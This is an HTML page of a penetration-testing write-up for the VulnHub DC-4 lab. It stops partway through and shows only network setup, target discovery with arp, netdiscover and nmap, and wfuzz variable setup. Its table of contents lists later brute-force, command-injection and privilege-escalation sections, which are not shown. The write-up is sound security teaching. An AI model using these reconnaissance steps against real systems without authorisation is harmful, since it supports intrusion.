<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>DC-4 of the DC Series - PivotTheNet</title><meta name=author content="revsh3ll"><meta name=author-link content><meta name=description content="DC-4 from the DC-Series(VulnHub)."><meta name=keywords content="CTF (self-hosted),Fuzzing,ZAP,wfuzz,Brute-force,Sudo abuse,nmap,Metasploit,Enumeration"><meta itemprop=name content="DC-4 of the DC Series"><meta itemprop=description content="DC-4 from the DC-Series(VulnHub)."><meta itemprop=datePublished content="2024-02-14T13:00:00-05:00"><meta itemprop=dateModified content="2024-02-14T13:00:00-05:00"><meta itemprop=wordCount content="5765"><meta itemprop=image content="https://PivotTheNet.GitHub.io/avatar.png"><meta itemprop=keywords content="CTF (self-hosted),Fuzzing,ZAP,wfuzz,Brute-force,Sudo abuse,nmap,Metasploit,Enumeration,"><meta property="og:title" content="DC-4 of the DC Series"><meta property="og:description" content="DC-4 from the DC-Series(VulnHub)."><meta property="og:type" content="article"><meta property="og:url" content="https://PivotTheNet.GitHub.io/dc-4/"><meta property="og:image" content="https://PivotTheNet.GitHub.io/avatar.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-02-14T13:00:00-05:00"><meta property="article:modified_time" content="2024-02-14T13:00:00-05:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://PivotTheNet.GitHub.io/avatar.png"><meta name=twitter:title content="DC-4 of the DC Series"><meta name=twitter:description content="DC-4 from the DC-Series(VulnHub)."><meta name=application-name content="PivotTheNet"><meta name=apple-mobile-web-app-title content="PivotTheNet"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://PivotTheNet.GitHub.io/dc-4/><link rel=prev href=https://PivotTheNet.GitHub.io/post-exploitation/><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"DC-4 of the DC Series","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/PivotTheNet.GitHub.io\/dc-4\/"},"genre":"posts","keywords":"CTF (self-hosted), Fuzzing, ZAP, wfuzz, Brute-force, Sudo abuse, nmap, Metasploit, Enumeration","wordcount":5765,"url":"https:\/\/PivotTheNet.GitHub.io\/dc-4\/","datePublished":"2024-02-14T13:00:00-05:00","dateModified":"2024-02-14T13:00:00-05:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"revsh3ll"},"description":"DC-4 from the DC-Series(VulnHub)."}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage?.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("data-theme","dark")</script><div class=wrapper data-page-style=wide><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper data-github-corner=right><div class=header-title><a href=/ title=PivotTheNet><img loading=lazy src=/dragon-tp-round-right.png data-title=PivotTheNet data-alt=PivotTheNet class=logo style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'><span class=header-title-pre>root:~# </span><span id=typeit-header-desktop class=typeit></span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/posts/ title=Posts><i class="fa-solid fa-book-skull fa-lg fa-fw fa-sm" aria-hidden=true></i> Posts</a></li><li class=menu-item><a class=menu-link href=/categories/ title=Categories><i class="fa-solid fa-floppy-disk fa-lg fa-fw fa-sm" aria-hidden=true></i> Categories</a></li><li class=menu-item><a class=menu-link href=/tags/ title=Tags><i class="fa-solid fa-tags fa-lg fa-fw fa-sm" aria-hidden=true></i> Tags</a></li><li class=menu-item><a class=menu-link href=/whoami title=whoami><i class="fa-solid fa-user-secret fa-lg fa-fw fa-sm" aria-hidden=true></i> whoami</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder="Search titles or contents ..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fa-solid fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=PivotTheNet><img loading=lazy src=/dragon-tp-round-right.png data-title=/dragon-tp-round-right.png data-alt=/dragon-tp-round-right.png class=logo style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'><span class=header-title-pre>root:~# </span><span id=typeit-header-title-mobile class=typeit></span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents ..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fa-solid fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></li><li class=menu-item><a class=menu-link href=/posts/ title=Posts><i class="fa-solid fa-book-skull fa-lg fa-fw fa-sm" aria-hidden=true></i> Posts</a></li><li class=menu-item><a class=menu-link href=/categories/ title=Categories><i class="fa-solid fa-floppy-disk fa-lg fa-fw fa-sm" aria-hidden=true></i> Categories</a></li><li class=menu-item><a class=menu-link href=/tags/ title=Tags><i class="fa-solid fa-tags fa-lg fa-fw fa-sm" aria-hidden=true></i> Tags</a></li><li class=menu-item><a class=menu-link href=/whoami title=whoami><i class="fa-solid fa-user-secret fa-lg fa-fw fa-sm" aria-hidden=true></i> whoami</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><nav aria-label=breadcrumb class="breadcrumb-container sticky"><ol class=breadcrumb><li class=breadcrumb-item><a href=/ title=PivotTheNet>Home</a></li><li class=breadcrumb-item><a href=/posts/ title=Posts>Posts</a></li><li class="breadcrumb-item active" aria-current=page>DC-4 of the DC Series</li></ol></nav><main class=container><aside class=toc id=toc-auto><h2 class=toc-title>Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class="toc-content always-active" id=toc-content-auto></div></aside><aside class=aside-custom></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>DC-4 of the DC Series</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><span class=author><img loading=lazy src=/avatar.png data-title=revsh3ll data-alt=revsh3ll class=avatar style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'>&nbsp;revsh3ll</span></span>
<span class=post-category>included in <a href=/categories/vulnhub/><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> VulnHub</a></span></div><div class=post-meta-line><span title="published on 2024-02-14 13:00:00"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden=true></i><time datetime=02-14-2024>02-14-2024</time></span>&nbsp;<span title="Updated on 2024-02-14 13:00:00"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden=true></i><time datetime=02-14-2024>02-14-2024</time></span>&nbsp;<span title="5765 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>About 5800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>28 minutes</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#dc-4-details>DC-4 Details</a></li><li><a href=#configuring-a-safe-network-for-dc-4>Configuring a Safe Network for DC-4</a><ul><li><a href=#creating-a-host-only-virtual-network>Creating a host-only virtual network</a></li><li><a href=#assigning-dc-4-to-host-only-virtual-network>Assigning DC-4 to host-only virtual network</a></li></ul></li><li><a href=#obtaining-dc-4s-ip>Obtaining DC-4&rsquo;s IP</a><ul><li><a href=#arp-for-target-discovery>arp for target discovery</a></li><li><a href=#netdiscover-for-target-discovery>netdiscover for target discovery</a></li><li><a href=#nmap-for-target-discovery>nmap for target discovery</a></li></ul></li><li><a href=#set-environment-variablesoptional>Set Environment Variables(Optional)</a></li><li><a href=#nmap-scans>Nmap Scans</a><ul><li><a href=#nmap-all-port-scan>Nmap all port scan</a></li><li><a href=#nmap-service-scan>Nmap service scan</a></li></ul></li><li><a href=#directory-and-file-scans>Directory and File scans</a><ul><li><a href=#wfuzz-against-files>wfuzz against files</a></li><li><a href=#wfuzz-against-directories>wfuzz against directories</a></li><li><a href=#reviewing-wfuzz-results>reviewing wfuzz results</a></li></ul></li><li><a href=#interacting-with-the-web-server>Interacting with the web server</a><ul><li><a href=#checking-out-the-login-panel>Checking out the login panel</a></li></ul></li><li><a href=#brute-forcing-loginphp>Brute-forcing /login.php</a><ul><li><a href=#setup-brute-force-attack-in-zaproxy>Setup brute-force attack in zaproxy</a></li><li><a href=#analyzing-the-brute-force-results>Analyzing the brute-force results</a></li></ul></li><li><a href=#abusing-the-system-tools-toolbox>Abusing the &ldquo;System Tools&rdquo; toolbox</a><ul><li><a href=#probing-commandphp>Probing command.php</a></li><li><a href=#abusing-commandphp-for-code-injection>Abusing command.php for code injection</a></li><li><a href=#gaining-a-shell-as-www-data>Gaining a shell as www-data</a></li><li><a href=#upgrading-the-reverse-shell>Upgrading the reverse shell</a></li></ul></li><li><a href=#enumerating-dc-4>Enumerating DC-4</a><ul><li><a href=#digging-into-user-home-folders>Digging into user home folders</a></li></ul></li><li><a href=#attacking-ssh>Attacking SSH</a><ul><li><a href=#msfconsole-and-ssh-login>msfconsole and ssh-login</a></li></ul></li><li><a href=#accessing-dc-4-as-jim>Accessing DC-4 as &ldquo;jim&rdquo;</a></li><li><a href=#rooting-dc-4>Rooting DC-4</a><ul><li><a href=#access-as-charles>Access as charles</a></li><li><a href=#abusing-charles-privileges>Abusing charle&rsquo;s privileges</a></li><li><a href=#appending-new-user-into-etcpasswd>Appending new user into /etc/passwd</a></li><li><a href=#pwn-dc-4>Pwn DC-4</a></li></ul></li><li><a href=#quick-summary>Quick Summary</a></li></ul></nav></div></div><div class=content id=content><p>If you&rsquo;re wanting to learn SQLi and kernel exploitation, I&rsquo;d suggest loading up DC-3. It showcased the importance of keeping your systems, internal and external, updated(patched).<br>In the real world, keeping systems up-to-date can help deter attacks, by increasing the time and effort needed by the adversary, but can be difficult to implement. A vulnerability management framework can be a great step to a more secure infrastructure as it helps organize and implement remediation and mitigation efforts.<br>In the end, if a system is critical to business operations and it cannot be patched, apply mitigations where possible, e.g., air-gaps, etc</p><p>Anyways, onto DC-4!</p><hr><hr><h2 id=dc-4-details>DC-4 Details</h2><span style=color:cyan><details closed><summary>Dropdown to see DC-4's quick overview</summary><br>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.<p>Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&rsquo;t give you the answer, instead, I&rsquo;ll give you an idea about how to move forward.</p></details></span><p>Details can be found at <a href=https://www.vulnhub.com/entry/dc-4,313/ target=_blank rel="external nofollow noopener noreferrer">https://www.vulnhub.com/entry/dc-4,313/</a><br><br>⚠️ The creator of DC-4 seems to no longer have a working website, as of 2/5/24, so I&rsquo;m also including the link to vulnhub above.⚠️</p><p>Original Home page: <a href=http://www.five86.com/dc-4.html target=_blank rel="external nofollow noopener noreferrer">http://www.five86.com/dc-4.html</a></p><hr><hr><h2 id=configuring-a-safe-network-for-dc-4>Configuring a Safe Network for DC-4</h2><p>It&rsquo;s important to create a safe environment for both your attackbox(e.g., Kali) and any vulnerable host(e.g., DC-4).</p><h3 id=creating-a-host-only-virtual-network>Creating a host-only virtual network</h3><p>Depending on your lab environment and the hypervisor in use, the way DC-4 is assigned an IP address will vary. In my current layout, I have DC-4 being hosted through vmware workstation pro which runs directly on my main &ldquo;attackbox&rdquo;(e.g., Kali). Since I&rsquo;m working with a single VM, hosting directly on my attackbox is quicker and easier as it can provide features like drag and drop of files and a two way clipboard (useful when working with Windows hosts).</p><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i>FYI - DC-4 changes IP address mid-way<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content>FYI - DC-4 initially started with an IP of 192.168.0.128, but due to reloading DC-4 into VMware workstation, it later changes to 192.168.0.151.</div></div></div><br>To create a new host-only virtual network for VMware Workstation, follow these steps:<p>Open the vmware workstation network editor via terminal command <code>vmware-netcfg</code>. It may ask for your sudo password, as root privs are required.</p><ol><li><p>Click &ldquo;Add Network&rdquo; then select the desired number for the network host adapter name.</p></li><li><p>To keep the DC-4 isolated and only accessible by the host machine(attackbox), Click &ldquo;Host-only&rdquo;.</p></li><li><p>Enable &ldquo;Use local DHCP service&mldr;&rdquo;. This will assign DC-4 an IP address, within the private networkID we specify.</p></li><li><p>Enter &ldquo;Subnet IP&rdquo; and &ldquo;Subnet mask&rdquo; values. I went with 192.168.0.0 and 255.255.255.0, which will provide a IP range of 192.168.0.1-254.</p></li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/vmnet4-creation.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/vmnet4-creation.png?size=small" data-sub-html="<h2>Creating host-only virtual network on adapter vmnet4</h2><p>Creating host-only virtual network on adapter vmnet4</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/vmnet4-creation.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/vmnet4-creation.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/vmnet4-creation.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/vmnet4-creation.png?size=large 2x" sizes=auto data-title="Creating host-only virtual network on adapter vmnet4" data-alt="Creating host-only virtual network on adapter vmnet4" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>Creating host-only virtual network on adapter vmnet4</figcaption></figure></p><h3 id=assigning-dc-4-to-host-only-virtual-network>Assigning DC-4 to host-only virtual network</h3><p>Within DC-4&rsquo;s VMware settings, assign DC-4 to the newly created host-only network.<br>In this example, vmnet4 was created and assigned to DC-4&rsquo;s network adapter.</p><ol><li><p>Make sure &ldquo;Connected&rdquo; and &ldquo;Connect at power on&rdquo; are enabled.</p></li><li><p>Since we created a custom host-only adapter when creating the new virtual network, we&rsquo;ll need to select &ldquo;Custom&rdquo; followed by the adapter name created previously. In this example, vmnet4 was created, so it was selected.</p></li><li><p>Click &ldquo;save&rdquo; and <strong>power on the VM!</strong></p></li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/vmnet4-assignment.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/vmnet4-assignment.png?size=small" data-sub-html="<h2>Assign DC-4 to host-only network</h2><p>Assign DC-4 to host-only network</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/vmnet4-assignment.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/vmnet4-assignment.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/vmnet4-assignment.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/vmnet4-assignment.png?size=large 2x" sizes=auto data-title="Assign DC-4 to host-only network" data-alt="Assign DC-4 to host-only network" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>Assign DC-4 to host-only network</figcaption></figure></p><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i>Why not use &lsquo;Host-only: A private network shared with the host&rsquo;<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content>It&rsquo;s a good habit to create separate virtual networks for different projects to prevent&mldr; E.g., Accidentally attacking a VM outside the project, etc.</div></div></div><hr><hr><h2 id=obtaining-dc-4s-ip>Obtaining DC-4&rsquo;s IP</h2><p>With DC-4 configured and powered on, it should be reachable by our &ldquo;attackbox&rdquo;.</p><p><em>For clarification, I like to use the made up blanket term &ldquo;attackbox&rdquo; to refer to the system in which we&rsquo;re attacking <u>from</u>. As it can be of ANY OS/distro, and not just Kali.</em></p><br><p>There&rsquo;s many ways of discovering devices on a network. <code>arp</code>, <code>netdiscover</code>, and <code>nmap</code> are just a few.</p><p>I originally only included <code>netdiscover</code> for this writeup but I decided to also include <code>arp</code> and <code>nmap</code> examples.</p><p><em><strong>Don&rsquo;t mind the different IPs in my terminal output. I&rsquo;m writing this after the fact.</strong></em></p><h3 id=arp-for-target-discovery>arp for target discovery</h3><ol><li>Open a new terminal</li><li>Run <code>arp -i &lt;interface></code><br>a. <code>-i</code> tells arp to run the request only on a specific interface.<br>b. Replace <code>&lt;interface></code> with the interface DC-4 is connected to. In my case that&rsquo;s vmnet4.</li></ol><p>Quick overview of what ARP is doing&mldr;</p><p>You attack an IP address but layer 2 hardware has to figure out what hardware ID(MAC address) is related to the IP address you&rsquo;re attacking. This is where ARP comes into play.</p><p>ARP is a layer 2 protocol in the OSI model and is responsible for translating IP addresses to MAC addresses, aka resolving a MAC address to an IP address.<br>ARP requests and ARP replies are sent back and forth when a new device is added to a network or when a device can&rsquo;t be found. To speed things up and to reduce network congestion, devices will use a local ARP table(cache) to remember recent translations.</p><p>In the example screenshot below, you can see two IPs but only one has translated.<br>DC-4&rsquo;s 192.168.0.149 IP resolves to a MAC address, which was learned through the ARP protocol indicated by the &ldquo;Flag Mask&rdquo; value of <code>C</code>.<br>BUT 192.168.0.20 has a <code>(incomplete)</code> HWaddress value. This means ARP is unable to find a device at IP 192.168.0.20, which is true. That was a host I was testing with and it no longer exists on the network.</p><p>I&rsquo;ve included a wireshark screenshot to show the ARP requests being sent to the router at 192.168.0.1, looking for a device at 192.168.0.20.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-arp.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-arp.png?size=small" data-sub-html="<h2>arp scan example for vmnet4</h2><p>arp scan example for vmnet4</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/vmnet-arp.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-arp.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-arp.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-arp.png?size=large 2x" sizes=auto data-title="arp scan example for vmnet4" data-alt="arp scan example for vmnet4" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>arp scan example for vmnet4</figcaption></figure></p><h3 id=netdiscover-for-target-discovery>netdiscover for target discovery</h3><ol><li>Open a new terminal</li><li>Run <code>sudo netdiscover -i &lt;interface> -r &lt;ip-range></code><br>a. <code>-i</code> tells netdiscover to run the request only on the specified interface, vmnet4.<br>b. <code>-r</code> allows you to specify what IP range to run against. I placed the NetworkID/CIDR for vmnet4.</li></ol><p>The terminal output will change soon after running <code>netdiscover</code>, followed by any discovered devices.</p><ul><li>192.168.0.254 is vmnet4&rsquo;s DHCP server.</li><li>192.168.0.128 is DC-4&rsquo;s IP address, which is being assigned by vmnet4&rsquo;s DHCP server.</li></ul><p><code>netdiscover</code> works by sending ARP requests to every IP specified in the <code>-r</code> IP range. You can use the <code>-p</code> option to make <code>netdiscover</code> go into passive mode which only sniffs out ARP requests on the network. More can be found by running <code>man netdiscover</code>.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-input.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-input.png?size=small" data-sub-html="<h2>netdiscover input command - example for vmnet4</h2><p>[netdiscover input command - example for vmnet4</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-input.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-input.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-input.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-input.png?size=large 2x" sizes=auto data-title="[netdiscover input command - example for vmnet4" data-alt="netdiscover input command - example for vmnet4" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>netdiscover input command - example for vmnet4</figcaption></figure></p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-output.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-output.png?size=small" data-sub-html="<h2>netdiscover output - example for vmnet4</h2><p>[netdiscover output command - example for vmnet4</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-output.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-output.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-output.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-netdiscover-output.png?size=large 2x" sizes=auto data-title="[netdiscover output command - example for vmnet4" data-alt="netdiscover output - example for vmnet4" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>netdiscover output - example for vmnet4</figcaption></figure></p><h3 id=nmap-for-target-discovery>nmap for target discovery</h3><p><em><strong>ping scan with Nmap</strong></em></p><ol><li>Open a terminal</li><li>Run <code>nmap -sn &lt;networkID/CIDR></code><br>a. <code>-sn</code> tells Nmap to only run a ping scan against the IP(s) specified and DISABLES port scan!<br>b. <code>&lt;networkID/CIDR></code> is the IP(s) we want to scan. In my case, 192.168.0.0/24.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-only.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-only.png?size=small" data-sub-html="<h2>nmap ping only - example for vmnet4</h2><p>nmap ping only - example for vmnet4</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-only.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-only.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-only.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-only.png?size=large 2x" sizes=auto data-title="nmap ping only - example for vmnet4" data-alt="nmap ping only - example for vmnet4" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>nmap ping only - example for vmnet4</figcaption></figure></p><p><em><strong>ARP scan with Nmap</strong></em></p><ol><li>Open a terminal</li><li>Run <code>nmap -sn -PR &lt;networkID/CIDR></code><br>a. <code>-sn</code> tells Nmap to only run a ping scan against the IP(s) specified and DISABLES port scan!<br>b. <code>-PR</code> tells Nmap to run an ARP scan too.<br>c. <code>&lt;networkID/CIDR></code> is the IP(s) we want to scan. In my case, 192.168.0.0/24.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-ARP.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-ARP.png?size=small" data-sub-html="<h2>nmap ARP - example for vmnet4</h2><p>nmap ARP - example for vmnet4</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-ARP.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-ARP.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-ARP.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/vmnet-nmap-ping-ARP.png?size=large 2x" sizes=auto data-title="nmap ARP - example for vmnet4" data-alt="nmap ARP - example for vmnet4" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>nmap ARP - example for vmnet4</figcaption></figure></p><hr><hr><h2 id=set-environment-variablesoptional>Set Environment Variables(Optional)</h2><p>Setting up environment variables can help ease the need of remembering an IP, etc. This step is optional, so feel free to skip to <a href=#nmap-scans>Nmap Scans</a>.</p><p>In this example, I&rsquo;m using DC-4&rsquo;s IP address. Change the IP as needed.</p><ol><li><code>export IP="192.168.0.128"</code> - exports DC-4&rsquo;s IP address to variable $IP</li><li><code>export URLdir="http://192.168.0.128/FUZZ/"</code> - exports URL for fuzzing directories with wfuzz</li><li><code>export URLfile="http://192.168.0.128/FUZZ"</code> - export URL for fuzzing files with wfuzz</li><li><code>echo $IP; echo $URLdir; echo $URLfile</code> - returns exported vars, so we can verify their values</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/var-assignments.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/var-assignments.png?size=small" data-sub-html="<h2>environment variable assignments</h2><p>environment variable assignments</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/var-assignments.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/var-assignments.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/var-assignments.png?size=medium 1.5x, 